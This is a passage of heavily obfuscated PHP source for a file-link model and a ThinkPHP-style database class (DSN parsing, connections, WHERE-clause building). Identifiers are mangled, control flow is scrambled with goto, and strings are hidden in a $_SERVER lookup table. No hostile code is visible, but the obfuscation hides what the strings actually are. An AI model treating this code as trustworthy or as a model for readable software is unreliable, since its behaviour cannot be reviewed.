$d†éõš›ÜØ); $this->where(array($f—Õ»Ã°å¾[420] => $aÑñ­Îñù›[$f—Õ»Ã°å¾[419]]))->save($AÜ±Ğ›¯ªØ); return $aÑñ­Îñù›; } public function remove($fŠâ’Õ«¢‰) { $this->linkCountChange($fŠâ’Õ«¢‰, !1); $this->clearEmpty(); return !0; } public function linkAdd($eÎÉ˜İìÀ) { $this->linkCountChange($eÎÉ˜İìÀ, !0); } public function linkCountChange($B¼¿Íí‰Ó, $f­ ‰Å‘˜Ó) { goto bÛìËòğ”¤; bÛìËòğ”¤: $Aø´ƒÔğ»† =& $_SERVER[Î¿—”òá]; if (!$B¼¿Íí‰Ó) { return; } if (!is_array($B¼¿Íí‰Ó)) { $B¼¿Íí‰Ó = array($B¼¿Íí‰Ó); } goto a²œôÛÅŠå; b™õ®·ãíŒ: foreach ($D°Í²øòĞ as $d©˜Úİ¨Ìµ => $b‰Æ´ÕÚˆ) { $DÁĞŠ”Ÿ„¬ = $b‰Æ´ÕÚˆ . $Aø´ƒÔğ»†[33]; if (!$föó§°¡Ş[$DÁĞŠ”Ÿ„¬]) { $föó§°¡Ş[$DÁĞŠ”Ÿ„¬] = array(); } $föó§°¡Ş[$DÁĞŠ”Ÿ„¬][] = $d©˜Úİ¨Ìµ; } foreach ($föó§°¡Ş as $b‰Æ´ÕÚˆ => $DâÊê’­Ã§) { if (!$DâÊê’­Ã§) { continue; } $b‰Æ´ÕÚˆ = $f­ ‰Å‘˜Ó ? $b‰Æ´ÕÚˆ : -intval($b‰Æ´ÕÚˆ); $Cî·»ÓÕØ = array($Aø´ƒÔğ»†[419] => array($Aø´ƒÔğ»†[7], $DâÊê’­Ã§)); if ($b‰Æ´ÕÚˆ < 0) { $Cî·»ÓÕØ[$Aø´ƒÔğ»†[2154]] = array($Aø´ƒÔğ»†[922], abs($b‰Æ´ÕÚˆ)); } $this->where($Cî·»ÓÕØ)->setAdd($Aø´ƒÔğ»†[2154], $b‰Æ´ÕÚˆ); } goto dÄÈ“™ŒÉ; a²œôÛÅŠå: $D°Í²øòĞ = array(); foreach ($B¼¿Íí‰Ó as $d©˜Úİ¨Ìµ) { $DÁĞŠ”Ÿ„¬ = $d©˜Úİ¨Ìµ . $Aø´ƒÔğ»†[33]; if (!$D°Í²øòĞ[$DÁĞŠ”Ÿ„¬]) { $D°Í²øòĞ[$DÁĞŠ”Ÿ„¬] = 0; } $D°Í²øòĞ[$DÁĞŠ”Ÿ„¬]++; } $föó§°¡Ş = array(); goto b™õ®·ãíŒ; dÄÈ“™ŒÉ: } public function findByHash($aâ¢¹®‘ÂÚ, $B…Ûİ›Œ‡ = false) { $AÅ˜îœ¶Û“ =& $_SERVER[Î¿—”òá]; if (!$aâ¢¹®‘ÂÚ && !$B…Ûİ›Œ‡) { return !1; } $A¯ìƒƒ»¾¡ = array($AÅ˜îœ¶Û“[2152] => $aâ¢¹®‘ÂÚ); if ($B…Ûİ›Œ‡) { $A¯ìƒƒ»¾¡ = array($AÅ˜îœ¶Û“[2153] => $B…Ûİ›Œ‡); } return $this->order($AÅ˜îœ¶Û“[2155])->where($A¯ìƒƒ»¾¡)->find(); } public function clearEmpty($Aµ‘Ö‹¡±ö = 0) { goto a—‰í§º’‡; a—‰í§º’‡: $aáÁ‡‚÷Ë =& $_SERVER[Î¿—”òá]; $b¤èÚ×Ì°ì = time() - 3600 * 24 * $Aµ‘Ö‹¡±ö; $E¥í¼„› = $aáÁ‡‚÷Ë[2156] . $b¤èÚ×Ì°ì; goto f¶ì±àÙã; f¶ì±àÙã: $bäÅ©–É·³ = $this->where($E¥í¼„›)->select(); if (!$bäÅ©–É·³) { return; } $BŸÒ¢ƒÍÂ = new Task($aáÁ‡‚÷Ë[2157], $aáÁ‡‚÷Ë[33], count($bäÅ©–É·³)); goto FôËË¢ßé‰; FôËË¢ßé‰: foreach ($bäÅ©–É·³ as $F„à¼óø·İ) { $BŸÒ¢ƒÍÂ->update(1); $this->resetFile($F„à¼óø·İ); } $BŸÒ¢ƒÍÂ->end(); goto F­ÒÙÓÜÙä; F­ÒÙÓÜÙä: } private function resetFile($b‰„ÑºŒß) { goto F‘¢õ³ï’ã; f®Áø’âÇù: if ($b‰„ÑºŒß[$c¸†åÊŠÍ[2154]] != $E°Èø¡Ù³™) { $this->where($eò™Äµ¡¥)->save(array($c¸†åÊŠÍ[2151] => $E°Èø¡Ù³™)); } goto cà’öŒ¤á‘; aÕˆÙá”¸: $AÎ èìĞ‰ = Model($c¸†åÊŠÍ[2158])->where($eò™Äµ¡¥)->count(); $E°Èø¡Ù³™ = intval($dÎøĞ‹ŒÃˆ) + intval($AÎ èìĞ‰); if ($E°Èø¡Ù³™ == 0) { IO::remove($b‰„ÑºŒß[$c¸†åÊŠÍ[75]]); $this->where($eò™Äµ¡¥)->delete(); $this->metaSet($b‰„ÑºŒß[$c¸†åÊŠÍ[419]], null, null); return; } goto f®Áø’âÇù; F‘¢õ³ï’ã: $c¸†åÊŠÍ =& $_SERVER[Î¿—”òá]; $eò™Äµ¡¥ = array($c¸†åÊŠÍ[420] => $b‰„ÑºŒß[$c¸†åÊŠÍ[419]]); $dÎøĞ‹ŒÃˆ = Model($c¸†åÊŠÍ[1110])->where($eò™Äµ¡¥)->count(); goto aÕˆÙá”¸; cà’öŒ¤á‘: } public function storageInfo($A¤ñ¤°ŠŠ÷ = false) { goto CëÙÚ¸öµ; D÷Í¾­õ¿‡: $Aİ¡ÓËÒŞ = 1; $bèÂ¼’‰† = 0; $A›ƒÊŸß†ï = 5000; goto DÙÃ¼ ³½Å; DÙÃ¼ ³½Å: for ($Eš†­ŠÑ£ˆ = 0; $Eš†­ŠÑ£ˆ < $aÄ’•ôŠ±Ğ; $Eš†­ŠÑ£ˆ = $Eš†­ŠÑ£ˆ + $A›ƒÊŸß†ï) { $CÔùç“ÁÖ = $this->limit($Eš†­ŠÑ£ˆ, $Eš†­ŠÑ£ˆ + $A›ƒÊŸß†ï)->select(); foreach ($CÔùç“ÁÖ as $eÊ³íƒÄß) { $Aİ¡ÓËÒŞ += $eÊ³íƒÄß[$dÃË¹éøÙº[77]] * $eÊ³íƒÄß[$dÃË¹éøÙº[2154]]; $dÁİ‹ŒÙËª += $eÊ³íƒÄß[$dÃË¹éøÙº[77]] * ($eÊ³íƒÄß[$dÃË¹éøÙº[2154]] - 1); $bèÂ¼’‰† += $eÊ³íƒÄß[$dÃË¹éøÙº[2154]]; } } $fô©ªÓÑÙÕ = array($dÃË¹éøÙº[2159] => $Aİ¡ÓËÒŞ, $dÃË¹éøÙº[2160] => $dÁİ‹ŒÙËª, $dÃË¹éøÙº[2161] => $dÁİ‹ŒÙËª / $Aİ¡ÓËÒŞ, $dÃË¹éøÙº[81] => $aÄ’•ôŠ±Ğ, $dÃË¹éøÙº[2162] => $bèÂ¼’‰†); return $fô©ªÓÑÙÕ; goto c»£¹‘à; CëÙÚ¸öµ: $dÃË¹éøÙº =& $_SERVER[Î¿—”òá]; $aÄ’•ôŠ±Ğ = $this->count() + 0.0; $dÁİ‹ŒÙËª = 0; goto D÷Í¾­õ¿‡; c»£¹‘à: } } goto døÌÀßî°È; Aî›‰”¾†¾: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\151\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\x71" => "\x3d", "\x6e\145\x71" => "\74\x3e", "\x67\x74" => "\x3e", "\x65\x67\x74" => "\x3e\75", "\154\x74" => "\x3c", "\145\x6c\164" => "\74\75", "\x6e\x6f\x74\154\x69\153\x65" => "\x4e\117\x54\x20\x4c\111\113\105", "\x6c\151\153\x65" => "\114\x49\x4b\x45", "\x69\x6e" => "\x49\116", "\156\157\x74\x69\x6e" => "\x4e\x4f\124\x20\x49\x4e", "\156\157\164\x20\x69\156" => "\x4e\117\124\40\111\116", "\x62\145\164\167\145\x65\x6e" => "\102\x45\124\x57\x45\105\x4e", "\156\x6f\x74\x62\x65\164\x77\x65\x65\x6e" => "\x4e\x4f\x54\x20\x42\105\x54\x57\105\105\x4e", "\x6e\157\x74\40\142\145\164\167\x65\x65\156" => "\x4e\117\x54\40\x42\x45\124\127\x45\x45\x4e"); protected $selectSql = "\x53\105\x4c\105\x43\124\45\104\111\x53\124\111\x4e\103\124\45\40\45\x46\111\105\x4c\104\x25\40\106\x52\117\115\40\45\x54\x41\102\x4c\x45\45\45\112\x4f\111\116\45\45\x57\x48\x45\x52\x45\45\45\107\122\117\x55\120\x25\x25\x48\101\126\x49\x4e\107\x25\x25\117\122\x44\x45\x52\x25\x25\x4c\111\115\x49\124\45\x20\x25\125\x4e\x49\x4f\x4e\x25\45\x43\117\x4d\x4d\105\116\124\x25"; protected $bind = array(); public static function getInstance() { $eâ›¹ñÄğÏ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Î¿—”òá][868], $eâ›¹ñÄğÏ); } public function factory($B„Ò‰¯˜ß = '') { goto B¹ÎËİ‘¯; B†Âôƒ”Í: return $f—«¡º—•Ğ; goto eé¶Êƒ•”Œ; B¹ÎËİ‘¯: $f¥ø×Š‚Æê =& $_SERVER[Î¿—”òá]; $B„Ò‰¯˜ß = $this->parseConfig($B„Ò‰¯˜ß); if (empty($B„Ò‰¯˜ß[$f¥ø×Š‚Æê[869]])) { think_exception(think_lang($f¥ø×Š‚Æê[870])); } goto aËĞˆÖ¯ñì; aËĞˆÖ¯ñì: $this->dbType = ucwords(strtolower($B„Ò‰¯˜ß[$f¥ø×Š‚Æê[869]])); $b—îÏÁŞ‡º = $f¥ø×Š‚Æê[871] . $this->dbType; if (class_exists($b—îÏÁŞ‡º)) { $f—«¡º—•Ğ = new $b—îÏÁŞ‡º($B„Ò‰¯˜ß); if ($f¥ø×Š‚Æê[720] != strtolower($B„Ò‰¯˜ß[$f¥ø×Š‚Æê[869]])) { $f—«¡º—•Ğ->dbType = strtoupper($this->dbType); } else { $f—«¡º—•Ğ->dbType = $this->_getDsnType($B„Ò‰¯˜ß[$f¥ø×Š‚Æê[821]]); } } else { think_exception(think_lang($f¥ø×Š‚Æê[872]) . $f¥ø×Š‚Æê[873] . $b—îÏÁŞ‡º); } goto B†Âôƒ”Í; eé¶Êƒ•”Œ: } public function __call($Cİ¢Ç´¹Ğ, $aÚª¹¼Òì¶) { if (method_exists($this, $Cİ¢Ç´¹Ğ)) { return call_user_func_array(array($this, $Cİ¢Ç´¹Ğ), $aÚª¹¼Òì¶); } } protected function _getDsnType($f†â‹óÈ‰Ó) { $CÒºô§†¹× = explode($_SERVER[Î¿—”òá][4], $f†â‹óÈ‰Ó); $Cèà²•²Ğù = strtoupper(trim($CÒºô§†¹×[0])); return $Cèà²•²Ğù; } private function parseConfig($fÔ”ù¶ªÌÇ = '') { $a¼Üïáƒ±Ë =& $_SERVER[Î¿—”òá]; if (!empty($fÔ”ù¶ªÌÇ) && is_string($fÔ”ù¶ªÌÇ)) { $fÔ”ù¶ªÌÇ = $this->parseDSN($fÔ”ù¶ªÌÇ); } elseif (is_array($fÔ”ù¶ªÌÇ)) { $fÔ”ù¶ªÌÇ = array_change_key_case($fÔ”ù¶ªÌÇ); $fÔ”ù¶ªÌÇ = array($a¼Üïáƒ±Ë[869] => $fÔ”ù¶ªÌÇ[$a¼Üïáƒ±Ë[719]], $a¼Üïáƒ±Ë[794] => $fÔ”ù¶ªÌÇ[$a¼Üïáƒ±Ë[874]], $a¼Üïáƒ±Ë[795] => $fÔ”ù¶ªÌÇ[$a¼Üïáƒ±Ë[875]], $a¼Üïáƒ±Ë[792] => $fÔ”ù¶ªÌÇ[$a¼Üïáƒ±Ë[876]], $a¼Üïáƒ±Ë[793] => $fÔ”ù¶ªÌÇ[$a¼Üïáƒ±Ë[877]], $a¼Üïáƒ±Ë[17] => $fÔ”ù¶ªÌÇ[$a¼Üïáƒ±Ë[878]], $a¼Üïáƒ±Ë[821] => $fÔ”ù¶ªÌÇ[$a¼Üïáƒ±Ë[721]], $a¼Üïáƒ±Ë[13] => isset($fÔ”ù¶ªÌÇ[$a¼Üïáƒ±Ë[879]]) ? $fÔ”ù¶ªÌÇ[$a¼Üïáƒ±Ë[879]] : array()); } elseif (empty($fÔ”ù¶ªÌÇ)) { if (think_config($a¼Üïáƒ±Ë[880]) && $a¼Üïáƒ±Ë[720] != strtolower(think_config($a¼Üïáƒ±Ë[881]))) { $fÔ”ù¶ªÌÇ = $this->parseDSN(think_config($a¼Üïáƒ±Ë[880])); } else { $fÔ”ù¶ªÌÇ = array($a¼Üïáƒ±Ë[869] => think_config($a¼Üïáƒ±Ë[881]), $a¼Üïáƒ±Ë[794] => think_config($a¼Üïáƒ±Ë[882]), $a¼Üïáƒ±Ë[795] => think_config($a¼Üïáƒ±Ë[883]), $a¼Üïáƒ±Ë[792] => think_config($a¼Üïáƒ±Ë[884]), $a¼Üïáƒ±Ë[793] => think_config($a¼Üïáƒ±Ë[885]), $a¼Üïáƒ±Ë[17] => think_config($a¼Üïáƒ±Ë[234]), $a¼Üïáƒ±Ë[821] => think_config($a¼Üïáƒ±Ë[880]), $a¼Üïáƒ±Ë[13] => think_config($a¼Üïáƒ±Ë[886])); } } return $fÔ”ù¶ªÌÇ; } protected function initConnect($Cİ¾‰ŞšÏ¾ = true) { if (1 == think_config($_SERVER[Î¿—”òá][18])) { $this->_linkID = $this->multiConnect($Cİ¾‰ŞšÏ¾); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($cğïîğ¹…Ÿ = false) { $f×ÈÃŠô‡³ =& $_SERVER[Î¿—”òá]; static $E÷Û§‰Â¢ = array(); if (empty($E÷Û§‰Â¢)) { foreach ($this->config as $cé…Š°Ğ¯ => $fİµ‚ùâ¦Ë) { $E÷Û§‰Â¢[$cé…Š°Ğ¯] = explode($f×ÈÃŠô‡³[47], $fİµ‚ùâ¦Ë); } } if (think_config($f×ÈÃŠô‡³[887])) { if ($cğïîğ¹…Ÿ) { $F¤Éƒô×Şƒ = floor(mt_rand(0, think_config($f×ÈÃŠô‡³[888]) - 1)); } else { if (is_numeric(think_config($f×ÈÃŠô‡³[889]))) { $F¤Éƒô×Şƒ = think_config($f×ÈÃŠô‡³[889]); } else { $F¤Éƒô×Şƒ = floor(mt_rand(think_config($f×ÈÃŠô‡³[888]), count($E÷Û§‰Â¢[$f×ÈÃŠô‡³[792]]) - 1)); } } } else { $F¤Éƒô×Şƒ = floor(mt_rand(0, count($E÷Û§‰Â¢[$f×ÈÃŠô‡³[792]]) - 1)); } $dÀÚ¶ÕëÅî = array($f×ÈÃŠô‡³[794] => isset($E÷Û§‰Â¢[$f×ÈÃŠô‡³[794]][$F¤Éƒô×Şƒ]) ? $E÷Û§‰Â¢[$f×ÈÃŠô‡³[794]][$F¤Éƒô×Şƒ] : $E÷Û§‰Â¢[$f×ÈÃŠô‡³[794]][0], $f×ÈÃŠô‡³[795] => isset($E÷Û§‰Â¢[$f×ÈÃŠô‡³[795]][$F¤Éƒô×Şƒ]) ? $E÷Û§‰Â¢[$f×ÈÃŠô‡³[795]][$F¤Éƒô×Şƒ] : $E÷Û§‰Â¢[$f×ÈÃŠô‡³[795]][0], $f×ÈÃŠô‡³[792] => isset($E÷Û§‰Â¢[$f×ÈÃŠô‡³[792]][$F¤Éƒô×Şƒ]) ? $E÷Û§‰Â¢[$f×ÈÃŠô‡³[792]][$F¤Éƒô×Şƒ] : $E÷Û§‰Â¢[$f×ÈÃŠô‡³[792]][0], $f×ÈÃŠô‡³[793] => isset($E÷Û§‰Â¢[$f×ÈÃŠô‡³[793]][$F¤Éƒô×Şƒ]) ? $E÷Û§‰Â¢[$f×ÈÃŠô‡³[793]][$F¤Éƒô×Şƒ] : $E÷Û§‰Â¢[$f×ÈÃŠô‡³[793]][0], $f×ÈÃŠô‡³[17] => isset($E÷Û§‰Â¢[$f×ÈÃŠô‡³[17]][$F¤Éƒô×Şƒ]) ? $E÷Û§‰Â¢[$f×ÈÃŠô‡³[17]][$F¤Éƒô×Şƒ] : $E÷Û§‰Â¢[$f×ÈÃŠô‡³[17]][0], $f×ÈÃŠô‡³[821] => isset($E÷Û§‰Â¢[$f×ÈÃŠô‡³[821]][$F¤Éƒô×Şƒ]) ? $E÷Û§‰Â¢[$f×ÈÃŠô‡³[821]][$F¤Éƒô×Şƒ] : $E÷Û§‰Â¢[$f×ÈÃŠô‡³[821]][0], $f×ÈÃŠô‡³[13] => isset($E÷Û§‰Â¢[$f×ÈÃŠô‡³[13]][$F¤Éƒô×Şƒ]) ? $E÷Û§‰Â¢[$f×ÈÃŠô‡³[13]][$F¤Éƒô×Şƒ] : $E÷Û§‰Â¢[$f×ÈÃŠô‡³[13]][0]); return $this->connect($dÀÚ¶ÕëÅî, $F¤Éƒô×Şƒ); } public function parseDSN($bñÆ‚´Ì•) { $Dëøâó½Ô =& $_SERVER[Î¿—”òá]; if (empty($bñÆ‚´Ì•)) { return !1; } $E¥éÅŒ­‘® = parse_url($bñÆ‚´Ì•); if ($E¥éÅŒ­‘®[$Dëøâó½Ô[168]]) { $E¿Ê»ëåÚ = array($Dëøâó½Ô[869] => $E¥éÅŒ­‘®[$Dëøâó½Ô[168]], $Dëøâó½Ô[794] => isset($E¥éÅŒ­‘®[$Dëøâó½Ô[535]]) ? $E¥éÅŒ­‘®[$Dëøâó½Ô[535]] : $Dëøâó½Ô[33], $Dëøâó½Ô[795] => isset($E¥éÅŒ­‘®[$Dëøâó½Ô[890]]) ? $E¥éÅŒ­‘®[$Dëøâó½Ô[890]] : $Dëøâó½Ô[33], $Dëøâó½Ô[792] => isset($E¥éÅŒ­‘®[$Dëøâó½Ô[169]]) ? $E¥éÅŒ­‘®[$Dëøâó½Ô[169]] : $Dëøâó½Ô[33], $Dëøâó½Ô[793] => isset($E¥éÅŒ­‘®[$Dëøâó½Ô[170]]) ? $E¥éÅŒ­‘®[$Dëøâó½Ô[170]] : $Dëøâó½Ô[33], $Dëøâó½Ô[17] => isset($E¥éÅŒ­‘®[$Dëøâó½Ô[75]]) ? substr($E¥éÅŒ­‘®[$Dëøâó½Ô[75]], 1) : $Dëøâó½Ô[33]); } else { preg_match($Dëøâó½Ô[891], trim($bñÆ‚´Ì•), $cñ¸è­¤äœ); $E¿Ê»ëåÚ = array($Dëøâó½Ô[869] => $cñ¸è­¤äœ[1], $Dëøâó½Ô[794] => $cñ¸è­¤äœ[2], $Dëøâó½Ô[795] => $cñ¸è­¤äœ[3], $Dëøâó½Ô[792] => $cñ¸è­¤äœ[4], $Dëøâó½Ô[793] => $cñ¸è­¤äœ[5], $Dëøâó½Ô[17] => $cñ¸è­¤äœ[6]); } $E¿Ê»ëåÚ[$Dëøâó½Ô[821]] = $Dëøâó½Ô[33]; return $E¿Ê»ëåÚ; } protected function debug() { $DÖ„¨òÎ”µ =& $_SERVER[Î¿—”òá]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $DÖ„¨òÎ”µ[892]; if (think_config($DÖ„¨òÎ”µ[893])) { think_status($DÖ„¨òÎ”µ[894]); think_trace($this->queryStr . $DÖ„¨òÎ”µ[895] . think_status($DÖ„¨òÎ”µ[20], $DÖ„¨òÎ”µ[894], 6) . $DÖ„¨òÎ”µ[896], $DÖ„¨òÎ”µ[33], $DÖ„¨òÎ”µ[897]); } } protected function parseLock($c•ï”ªÍÁ­ = false) { $A»›ÈÑ¥õ² =& $_SERVER[Î¿—”òá]; if (!$c•ï”ªÍÁ­) { return $A»›ÈÑ¥õ²[33]; } if ($A»›ÈÑ¥õ²[823] == $this->dbType) { return $A»›ÈÑ¥õ²[898]; } return $A»›ÈÑ¥õ²[899]; } protected function parseSet($aÊ´ÚšÌ´ë) { $e³©©Ü¶İ† =& $_SERVER[Î¿—”òá]; foreach ($aÊ´ÚšÌ´ë as $eÊö¶¿£İÇ => $DÛÂßèœŠ) { if (is_array($DÛÂßèœŠ) && $e³©©Ü¶İ†[285] == $DÛÂßèœŠ[0]) { $e‘ÒœÕ¼Ê„[] = $this->parseKey($eÊö¶¿£İÇ) . $e³©©Ü¶İ†[900] . $DÛÂßèœŠ[1]; } elseif (is_scalar($DÛÂßèœŠ) || is_null($DÛÂßèœŠ)) { $e‘ÒœÕ¼Ê„[] = $this->parseKey($eÊö¶¿£İÇ) . $e³©©Ü¶İ†[900] . $this->parseValue($DÛÂßèœŠ); } } return $e³©©Ü¶İ†[901] . implode($e³©©Ü¶İ†[47], $e‘ÒœÕ¼Ê„); } protected function bindParam($B»â¥Èá—î, $c›ÔÔÕ¾µ) { $this->bind[$_SERVER[Î¿—”òá][4] . $B»â¥Èá—î] = $c›ÔÔÕ¾µ; } protected function parseBind($c–Îùƒø‚÷) { $c–Îùƒø‚÷ = array_merge($this->bind, $c–Îùƒø‚÷); $this->bind = array(); return $c–Îùƒø‚÷; } function parseKey(&$b™ÌÚåëî, $a†ƒå—ôÑ¦ = true) { if ($a†ƒå—ôÑ¦) { $b™ÌÚåëî = $this->parseKeyCheck($b™ÌÚåëî); } return $b™ÌÚåëî; } function parseKeyCheck($fç‡º¢­Ü‘) { $f­©šŠØ• =& $_SERVER[Î¿—”òá]; $fç‡º¢­Ü‘ = trim($fç‡º¢­Ü‘); if (!preg_match($f­©šŠØ•[902], $fç‡º¢­Ü‘)) { think_exception($f­©šŠØ•[903] . $fç‡º¢­Ü‘); } return $fç‡º¢­Ü‘; } protected function parseValue($Dˆø¶êË) { $FÍ¸»£Œ¼ä =& $_SERVER[Î¿—”òá]; if (is_string($Dˆø¶êË)) { $Dˆø¶êË = $FÍ¸»£Œ¼ä[862] . $this->escapeString($Dˆø¶êË) . $FÍ¸»£Œ¼ä[862]; } elseif (isset($Dˆø¶êË[0]) && is_string($Dˆø¶êË[0]) && strtolower($Dˆø¶êË[0]) == $FÍ¸»£Œ¼ä[285]) { $Dˆø¶êË = $this->escapeString($Dˆø¶êË[1]); } elseif (is_array($Dˆø¶êË)) { $Dˆø¶êË = array_map(array($this, $FÍ¸»£Œ¼ä[863]), $Dˆø¶êË); } elseif (is_bool($Dˆø¶êË)) { $Dˆø¶êË = $Dˆø¶êË ? $FÍ¸»£Œ¼ä[83] : $FÍ¸»£Œ¼ä[468]; } elseif (is_null($Dˆø¶êË)) { $Dˆø¶êË = $FÍ¸»£Œ¼ä[99]; } return $Dˆø¶êË; } protected function parseField($F–²‡‚ç»Ü) { $c°Ø¾’­…Ë =& $_SERVER[Î¿—”òá]; if (is_string($F–²‡‚ç»Ü) && strpos($F–²‡‚ç»Ü, $c°Ø¾’­…Ë[47])) { $F–²‡‚ç»Ü = explode($c°Ø¾’­…Ë[47], $F–²‡‚ç»Ü); } if (is_array($F–²‡‚ç»Ü)) { $fÒÈïˆÈŒ = array(); foreach ($F–²‡‚ç»Ü as $fè¹ŒäÓ¨¬ => $c´³‡©¯áÛ) { if (!is_numeric($fè¹ŒäÓ¨¬)) { $fÒÈïˆÈŒ[] = $this->parseKey($fè¹ŒäÓ¨¬) . $c°Ø¾’­…Ë[904] . $this->parseKey($c´³‡©¯áÛ); } else { $fÒÈïˆÈŒ[] = $this->parseKey($c´³‡©¯áÛ); } } $dÄ´Ä¾çî = implode($c°Ø¾’­…Ë[47], $fÒÈïˆÈŒ); } elseif (is_string($F–²‡‚ç»Ü) && !empty($F–²‡‚ç»Ü)) { $dÄ´Ä¾çî = $F–²‡‚ç»Ü; } else { $dÄ´Ä¾çî = $c°Ø¾’­…Ë[176]; } return $dÄ´Ä¾çî; } protected function parseTable($F÷“×°ˆ) { $EÔÈ¥„ĞÏ =& $_SERVER[Î¿—”òá]; if (is_array($F÷“×°ˆ)) { $d¦È‚ã±à = array(); foreach ($F÷“×°ˆ as $eĞÆĞŒ’“ => $e¡´†İ´…§) { if (!is_numeric($eĞÆĞŒ’“)) { $d¦È‚ã±à[] = $this->parseKey($eĞÆĞŒ’“) . $EÔÈ¥„ĞÏ[50] . $this->parseKey($e¡´†İ´…§); } else { $d¦È‚ã±à[] = $this->parseKey($eĞÆĞŒ’“); } } $F÷“×°ˆ = $d¦È‚ã±à; } elseif (is_string($F÷“×°ˆ)) { if (strstr($F÷“×°ˆ, $EÔÈ¥„ĞÏ[50])) { return $F÷“×°ˆ; } $F÷“×°ˆ = explode($EÔÈ¥„ĞÏ[47], $F÷“×°ˆ); array_walk($F÷“×°ˆ, array($this, $EÔÈ¥„ĞÏ[811])); } return $EÔÈ¥„ĞÏ[905] . trim(implode($EÔÈ¥„ĞÏ[906], $F÷“×°ˆ), $EÔÈ¥„ĞÏ[817]) . $EÔÈ¥„ĞÏ[905]; } protected function parseWhere($CæÍ¤”µÜ“) { $eèòµÂÈÌğ =& $_SERVER[Î¿—”òá]; $B†¢£õŒâ = $eèòµÂÈÌğ[33]; if (is_string($CæÍ¤”µÜ“)) { $B†¢£õŒâ = $CæÍ¤”µÜ“; } else { $C÷Çğèİ§† = isset($CæÍ¤”µÜ“[$eèòµÂÈÌğ[907]]) ? strtoupper($CæÍ¤”µÜ“[$eèòµÂÈÌğ[907]]) : $eèòµÂÈÌğ[33]; if (in_array($C÷Çğèİ§†, array($eèòµÂÈÌğ[908], $eèòµÂÈÌğ[909], $eèòµÂÈÌğ[910]))) { $C÷Çğèİ§† = $eèòµÂÈÌğ[50] . $C÷Çğèİ§† . $eèòµÂÈÌğ[50]; unset($CæÍ¤”µÜ“[$eèòµÂÈÌğ[907]]); } else { $C÷Çğèİ§† = $eèòµÂÈÌğ[911]; } foreach ($CæÍ¤”µÜ“ as $fœ¤Í¸©“ => $bá¿À‰ç—) { $B†¢£õŒâ .= $eèòµÂÈÌğ[265]; if (is_numeric($fœ¤Í¸©“)) { $fœ¤Í¸©“ = $eèòµÂÈÌğ[912]; } if (0 === strpos($fœ¤Í¸©“, $eèòµÂÈÌğ[70])) { $B†¢£õŒâ .= $this->parseThinkWhere($fœ¤Í¸©“, $bá¿À‰ç—); } else { if (!preg_match($eèòµÂÈÌğ[913], trim($fœ¤Í¸©“))) { think_exception(think_lang($eèòµÂÈÌğ[914]) . $eèòµÂÈÌğ[4] . $fœ¤Í¸©“); } $eŞ²Óßñ® = is_array($bá¿À‰ç—) && isset($bá¿À‰ç—[$eèòµÂÈÌğ[915]]); $fœ¤Í¸©“ = trim($fœ¤Í¸©“); if (strpos($fœ¤Í¸©“, $eèòµÂÈÌğ[271])) { $d¿“Œ³ÓÌâ = explode($eèòµÂÈÌğ[271], $fœ¤Í¸©“); $DŠ¶áĞÓ®· = array(); foreach ($d¿“Œ³ÓÌâ as $cÉ¥Õ¾Ñğ† => $DˆÇ´¡¹ÁĞ) { $d•Ç¹Œë¼‰ = $eŞ²Óßñ® ? $bá¿À‰ç—[$cÉ¥Õ¾Ñğ†] : $bá¿À‰ç—; $DŠ¶áĞÓ®·[] = $eèòµÂÈÌğ[248] . $this->parseWhereItem($this->parseKey($DˆÇ´¡¹ÁĞ), $d•Ç¹Œë¼‰) . $eèòµÂÈÌğ[810]; } $B†¢£õŒâ .= implode($eèòµÂÈÌğ[916], $DŠ¶áĞÓ®·); } elseif (strpos($fœ¤Í¸©“, $eèòµÂÈÌğ[272])) { $d¿“Œ³ÓÌâ = explode($eèòµÂÈÌğ[272], $fœ¤Í¸©“); $DŠ¶áĞÓ®· = array(); foreach ($d¿“Œ³ÓÌâ as $cÉ¥Õ¾Ñğ† => $DˆÇ´¡¹ÁĞ) { $d•Ç¹Œë¼‰ = $eŞ²Óßñ® ? $bá¿À‰ç—[$cÉ¥Õ¾Ñğ†] : $bá¿À‰ç—; $DŠ¶áĞÓ®·[] = $eèòµÂÈÌğ[248] . $this->parseWhereItem($this->parseKey($DˆÇ´¡¹ÁĞ), $d•Ç¹Œë¼‰) . $eèòµÂÈÌğ[810]; } $B†¢£õŒâ .= implode($eèòµÂÈÌğ[911], $DŠ¶áĞÓ®·); } else { $B†¢£õŒâ .= $this->parseWhereItem($this->parseKey($fœ¤Í¸©“), $bá¿À‰ç—); } } $B†¢£õŒâ .= $eèòµÂÈÌğ[266] . $C÷Çğèİ§†; } $B†¢£õŒâ = substr($B†¢£õŒâ, 0, -strlen($C÷Çğèİ§†)); } return empty($B†¢£õŒâ) ? $eèòµÂÈÌğ[33] : $eèòµÂÈÌğ[917] . $B†¢£õŒâ; } protected function parseWhereItem($C™ô‡×Æé, $C¹­¯…¨³è) { $F¨í±¡÷À =& $_SERVER[Î¿—”òá]; $aô–ÙÂÑŒ† = $F¨í±¡÷À[33]; if (is_array($C¹­¯…¨³è)) { if (is_string($C¹­¯…¨³è[0])) { $cÁÜÍ¯‰ğ = strtolower($C¹­¯…¨³è[0]); if (in_array($C¹­¯…¨³è[0], array($F¨í±¡÷À[900], $F¨í±¡÷À[918], $F¨í±¡÷À[919], $F¨í±¡÷À[920], $F¨í±¡÷À[921], $F¨í±¡÷À[922]))) { $aô–ÙÂÑŒ† .= $C™ô‡×Æé . $F¨í±¡÷À[50] . $C¹­¯…¨³è[0] . $F¨í±¡÷À[50] . $this->parseValue($C¹­¯…¨³è[1]); } elseif (preg_match($F¨í±¡÷À[923], $C¹­¯…¨³è[0])) { $aô–ÙÂÑŒ† .= $C™ô‡×Æé . $F¨í±¡÷À[50] . $this->exp[$cÁÜÍ¯‰ğ] . $F¨í±¡÷À[50] . $this->parseValue($C¹­¯…¨³è[1]); } elseif (preg_match($F¨í±¡÷À[924], $C¹­¯…¨³è[0])) { if (is_array($C¹­¯…¨³è[1])) { $döôöäÙ„ = isset($C¹­¯…¨³è[2]) ? strtoupper($C¹­¯…¨³è[2]) : 